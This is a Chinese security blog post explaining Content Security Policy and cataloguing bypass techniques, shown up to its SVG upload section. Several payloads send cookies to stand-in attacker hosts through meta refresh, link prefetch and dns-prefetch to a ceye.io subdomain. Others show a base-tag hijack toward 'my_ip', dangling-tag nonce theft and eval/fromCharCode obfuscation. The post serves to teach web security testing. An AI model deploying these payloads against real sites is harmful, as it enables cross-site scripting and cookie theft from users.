<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="前端安全之 CSP 及其常见绕过"><meta name="keywords" content="CSP,前端"><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>前端安全之 CSP 及其常见绕过 | J0k3r's Blog</title><link rel="shortcut icon" href="/img/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?9e8a6ba1f41c0d7b000fcfd73f1c7929";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><link rel="dns-prefetch" href="https://www.google-analytics.com"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-159554347-1', 'auto');
ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-CSP-内容安全策略"><span class="toc-number">1.</span> <span class="toc-text">0x01 CSP (内容安全策略)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-CSP-是什么？"><span class="toc-number">1.1.</span> <span class="toc-text">1. CSP 是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-使用-CSP"><span class="toc-number">1.2.</span> <span class="toc-text">2. 使用 CSP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-CSP-Bypass"><span class="toc-number">2.</span> <span class="toc-text">0x02 CSP Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-URL-跳转"><span class="toc-number">2.1.</span> <span class="toc-text">1. URL 跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#default-src-‘none’-时"><span class="toc-number">2.1.1.</span> <span class="toc-text">default-src ‘none’ 时</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#script-src-‘unsafe-inline’-时"><span class="toc-number">2.1.2.</span> <span class="toc-text">script-src ‘unsafe-inline’ 时</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#script-src-‘unsafe-eval’-时"><span class="toc-number">2.1.3.</span> <span class="toc-text">script-src ‘unsafe-eval’ 时</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#标签预加载"><span class="toc-number">2.2.</span> <span class="toc-text">标签预加载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-dns-prefetch"><span class="toc-number">2.2.1.</span> <span class="toc-text">1. dns-prefetch</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-prefetch"><span class="toc-number">2.2.2.</span> <span class="toc-text">2. prefetch</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#标签补全"><span class="toc-number">2.3.</span> <span class="toc-text">标签补全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#上传-JS-文件并引用"><span class="toc-number">2.4.</span> <span class="toc-text">上传 JS 文件并引用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base-标签改变资源加载域"><span class="toc-number">2.5.</span> <span class="toc-text">base 标签改变资源加载域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码重用"><span class="toc-number">2.6.</span> <span class="toc-text">代码重用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#同源-iframe-绕过"><span class="toc-number">2.7.</span> <span class="toc-text">同源 iframe 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#meta-标签"><span class="toc-number">2.8.</span> <span class="toc-text">meta 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#svg-上传"><span class="toc-number">2.9.</span> <span class="toc-text">svg 上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#可控-JSONP-绕过"><span class="toc-number">2.10.</span> <span class="toc-text">可控 JSONP 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#object-src-绕过"><span class="toc-number">2.11.</span> <span class="toc-text">object-src 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#缓存绕过-CSP-nonce"><span class="toc-number">2.12.</span> <span class="toc-text">缓存绕过 CSP nonce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSS-选择器绕过-CSP"><span class="toc-number">2.13.</span> <span class="toc-text">CSS 选择器绕过 CSP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRLF"><span class="toc-number">2.14.</span> <span class="toc-text">CRLF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-总结"><span class="toc-number">2.15.</span> <span class="toc-text">0x03 总结</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center">求知若饥，虚心若愚</div><div class="follow-button"><a href="https://github.com/zhuxianjin">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">46</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">44</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/wallhaven-j5k275.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/links/">友链</a><a class="site-page" href="/kindle/">kindle</a><a class="site-page" href="/about/">关于我</a></span></div><div id="post-info"><div id="post-title">前端安全之 CSP 及其常见绕过</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-19</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>点击阅读</p>
<a id="more"></a>
<h2 id="0x01-CSP-内容安全策略"><a href="#0x01-CSP-内容安全策略" class="headerlink" title="0x01 CSP (内容安全策略)"></a>0x01 CSP (内容安全策略)</h2><h3 id="1-CSP-是什么？"><a href="#1-CSP-是什么？" class="headerlink" title="1. CSP 是什么？"></a>1. CSP 是什么？</h3><blockquote>
<p>内容安全策略  (CSP) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。</p>
</blockquote>
<p>使用 CSP 的主要目的就是通过指定<strong>有效域</strong>防御 XSS 这类的攻击</p>
<h3 id="2-使用-CSP"><a href="#2-使用-CSP" class="headerlink" title="2. 使用 CSP"></a>2. 使用 CSP</h3><ol>
<li>使用 <code>Content-Security-Policy</code> HTTP 头 </li>
</ol>
<ol start="2">
<li>html 标签</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>CSP 限制类型</p>
<p>常见：</p>
<p><code>default-src</code> 能够设置其他指令的值，其他指令为下面这几个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">child-src	//框架</span><br><span class="line">connect-src	//HTTP 连接（通过 XHR、WebSockets、EventSource等）</span><br><span class="line">font-src	//字体文件</span><br><span class="line">frame-src	//&lt;frame&gt; 和 &lt;iframe&gt;</span><br><span class="line">img-src	//图像</span><br><span class="line">manifest-src	//manifest 文件</span><br><span class="line">media-src	//媒体文件（音频和视频）</span><br><span class="line">object-src	//插件（比如 Flash）</span><br><span class="line">prefetch-src	//prefetch 和 prerender</span><br><span class="line">script-src	//外部脚本</span><br><span class="line">script-src-elem	//指定&lt;script&gt;有效来源，但未指定内嵌脚本事件处理程序（如onclick）</span><br><span class="line"></span><br><span class="line">script-src-attr	//和 script-src-elem 相反</span><br><span class="line">style-src	//样式表</span><br><span class="line">style-src-elem	//指定 rel=&quot;stylesheet&quot; 样式的 &lt;style&gt; 和 &lt;link&gt;</span><br><span class="line">style-src-attr	//指定单个DOM元素的内联样式有效来源</span><br><span class="line">worker-src	//worker脚本</span><br></pre></td></tr></table></figure>
<p>其他：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">base-uri</span><br><span class="line">block-all-mixed-content		//HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</span><br><span class="line">default-src</span><br><span class="line">form-action</span><br><span class="line">frame-ancestors</span><br><span class="line">navigate-to</span><br><span class="line">plugin-types	//限制可以使用的插件格式</span><br><span class="line">referrer</span><br><span class="line">report-to</span><br><span class="line">report-uri</span><br><span class="line">require-sri-for</span><br><span class="line">sandbox	//浏览器行为的限制，比如不能有弹出窗口等</span><br><span class="line">script-src-elem</span><br><span class="line">style-src-elem</span><br><span class="line">trusted-types</span><br><span class="line">upgrade-insecure-requests	//自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</span><br></pre></td></tr></table></figure>
<p>常见选项值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">主机名：example.org，https://example.com:443</span><br><span class="line">路径名：example.org/resources/js/</span><br><span class="line">通配符：*.example.org，*://*.example.com:*（表示任意协议、任意子域名、任意端口）</span><br><span class="line">协议名：https:、data:</span><br><span class="line">关键字&apos;self&apos;：当前域名，需要加引号</span><br><span class="line">关键字&apos;none&apos;：禁止加载任何外部资源，需要加引号</span><br></pre></td></tr></table></figure>
<p>多个值可以并列，用空格分隔</p>
<p>外部脚本只能从 <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a> 域中加载，而 default-src 则限制其他资源只从自身加载</p>
<p><code>script-src</code> 的特殊值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;unsafe-inline&apos;：允许执行页面内嵌的&lt;script&gt;标签和事件监听函数</span><br><span class="line">unsafe-eval：允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数。</span><br><span class="line">nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</span><br><span class="line">hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</span><br></pre></td></tr></table></figure>
<p>如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src https://example.com</span><br><span class="line"></span><br><span class="line">执行有 token 的脚本</span><br><span class="line">&lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt;</span><br><span class="line">  // some code</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Content-Security-Policy: script-src &apos;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=&apos;</span><br><span class="line"></span><br><span class="line">以下除 &lt;script&gt; 标签外的代码 hash 值等于设置值，所以会执行 </span><br><span class="line">&lt;script&gt;alert(&apos;Hello, world.&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>更多参数信息可以到 MDN Docs 查看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/" target="_blank" rel="noopener">Content-Security-Policy - HTTP | MDN</a></p>
<h2 id="0x02-CSP-Bypass"><a href="#0x02-CSP-Bypass" class="headerlink" title="0x02 CSP Bypass"></a>0x02 CSP Bypass</h2><h3 id="1-URL-跳转"><a href="#1-URL-跳转" class="headerlink" title="1. URL 跳转"></a>1. URL 跳转</h3><h4 id="default-src-‘none’-时"><a href="#default-src-‘none’-时" class="headerlink" title="default-src ‘none’ 时"></a>default-src ‘none’ 时</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=http://www.xss.com/x.php?c=[cookie]"</span> &gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="script-src-‘unsafe-inline’-时"><a href="#script-src-‘unsafe-inline’-时" class="headerlink" title="script-src ‘unsafe-inline’ 时"></a>script-src ‘unsafe-inline’ 时</h4><p>一些常用 javascript 重定向跳转方法</p>
<p>window.location</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.location=<span class="string">"http://eval.php?c=cookie"</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>window.location.href</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">"http://baidu.com"</span>; </span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>window.location.replace</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.location.replace(<span class="string">"http://baidu.com"</span>)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>window.open // Chrome 和 FireFox 默认会拦截弹出窗口</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.open(<span class="string">"http://baidu.com"</span>)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>self.location</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="javascript">self.location=<span class="string">'http://baidu.com'</span>; </span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>top.location</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="javascript">top.location=<span class="string">'http://baidu.com'</span>; </span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>有个 window.navigate 只针对 IE，所以不推荐</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.location=<span class="string">"http://baidu.com"</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">location.href=<span class="string">"http://baidu.com"</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> img、video、audio、iframe、a 等标签的 src 或 href 发起外域请求</p>
<h4 id="script-src-‘unsafe-eval’-时"><a href="#script-src-‘unsafe-eval’-时" class="headerlink" title="script-src ‘unsafe-eval’ 时"></a>script-src ‘unsafe-eval’ 时</h4><p>使用 eval 函数，结合 fromCharCode 可以 Bypass 一些常见过滤</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// c = 'document.location="http://baidu.com"'</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">100</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">61</span>, <span class="number">34</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">100</span>, <span class="number">117</span>, <span class="number">46</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">34</span>))</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="标签预加载"><a href="#标签预加载" class="headerlink" title="标签预加载"></a>标签预加载</h3><h4 id="1-dns-prefetch"><a href="#1-dns-prefetch" class="headerlink" title="1. dns-prefetch"></a>1. dns-prefetch</h4><p>dns-prefetch(DNS预解析) 允许浏览器在后台提前将资源的域名转换为 IP 地址，当用户访问该资源时就可以加快 DNS 解析</p>
<p>在 <code>default-src &#39;self&#39;; script-src &#39;self&#39; &#39;unsafe-inline&#39;;</code> 时可以使用</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//[some thing].xxxx.ceye.io"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>但是测试 FireFox 好像不大行</p>
<p>注意替换域名的特殊字符满足域名的规则 <code>[.-a-zA-Z0-9]+</code></p>
<h4 id="2-prefetch"><a href="#2-prefetch" class="headerlink" title="2. prefetch"></a>2. prefetch</h4><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Link_prefetching_FAQ" target="_blank" rel="noopener">Link Prefetch</a> (页面资源预加载)</p>
<blockquote>
<p>它利用浏览器的空闲时间来下载或预取用户可能在不久的将来访问的文档。<br>网页向浏览器提供一组预取提示，并且在浏览器完成页面加载后，它开始以静默方式预取指定的文档并将其存储在其缓存中</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"http://www.xss.com/x.php?c=[cookie]"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>但是本地测试新版 Chrome 和 FireFox 未成功</p>
<h3 id="标签补全"><a href="#标签补全" class="headerlink" title="标签补全"></a>标签补全</h3><p>比如使用 <code>Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39;</code>，当 nonce 相同才能执行脚本时</p>
<p>如果是类似下面情况</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>插入点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">"aa"</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'CSP'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>插入 <code>&lt;script src=//xxx x=&quot;</code>, 结果为</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//xxx</span> <span class="attr">x</span>=<span class="string">"&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;script id="</span><span class="attr">aa</span>" <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'CSP'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>虽然语法上提示有错误，但本地测试没有问题</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/csp-bypass.assets/7w6fAxl9bG2WFaU-20200109001529495.png" alt></p>
<p>xss 平台记录</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/csp-bypass.assets/q2C5pRsgaz7wFEr-20200109001532054.png" alt></p>
<h3 id="上传-JS-文件并引用"><a href="#上传-JS-文件并引用" class="headerlink" title="上传 JS 文件并引用"></a>上传 JS 文件并引用</h3><p><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></p>
<p>像这种只能加载同域 script 的 CSP 策略，就得从其自身域内下功夫了, 也可以控制其域内某个主机</p>
<p>其实也不一定非得是正常的 js 文件，如果有上传点，将 js 代码放在文件中，即文件中的内容被作为 js 代码解析</p>
<h3 id="base-标签改变资源加载域"><a href="#base-标签改变资源加载域" class="headerlink" title="base 标签改变资源加载域"></a>base 标签改变资源加载域</h3><p>default-src 默认并不会设置 base-uri，所以当遇到设置了 default-src 却没有 base-uri 时可以使用 base 标签更改页面上下文，这时页面中使用相对路径的 script 就可以加载 base 标签地址中相应的内容</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-test'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"//my_ip/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'test'</span> <span class="attr">src</span>=<span class="string">"2.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>script 会请求 <code>my_ip/2.js</code></p>
<h3 id="代码重用"><a href="#代码重用" class="headerlink" title="代码重用"></a>代码重用</h3><p>就是利用 JS 库绕过 CSP </p>
<p>Blackhat 2017</p>
<p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></p>
<h3 id="同源-iframe-绕过"><a href="#同源-iframe-绕过" class="headerlink" title="同源 iframe 绕过"></a>同源 iframe 绕过</h3><p>一个同源站点，存在多个页面，这时如果其中有一个页面没有 CSP 保护或者不严格而存在 XSS 漏洞，则可以使用 iframe 访问其他页面以绕过 CSP 限制</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"other csp page"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">iframe.src=<span class="string">"other csp page"</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="meta-标签"><a href="#meta-标签" class="headerlink" title="meta 标签"></a>meta 标签</h3><p>绕过 CSP nonce</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"cache-control"</span> <span class="attr">content</span>=<span class="string">"public"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="svg-上传"><a href="#svg-上传" class="headerlink" title="svg 上传"></a>svg 上传</h3><p>如果能上传 svg 矢量图片的话，就可以使用 svg 进行 xss</p>
